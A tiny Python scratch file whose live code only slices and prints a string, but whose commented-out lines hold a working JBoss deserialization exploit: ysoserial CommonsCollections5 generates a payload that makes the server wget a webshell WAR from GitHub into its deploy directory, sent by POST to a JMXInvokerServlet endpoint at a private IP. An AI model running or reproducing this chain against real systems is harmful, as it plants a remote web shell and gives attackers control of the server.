# import requests
# from subprocess import check_output


# o=check_output('java -jar ysoserial.jar CommonsCollections5 "wget -P /usr/share/jboss-5.1.0.GA/server/default/deploy https://github.com/tghosth/webshelljar/raw/master/webshell.war"', shell=True)
# res=requests.post('http://192.168.21.136:8080/invoker/JMXInvokerServlet',data=o)
# print(o)
s="aaaaf"
s=s[0:4]+s[4:]
# s="as"
print(s)
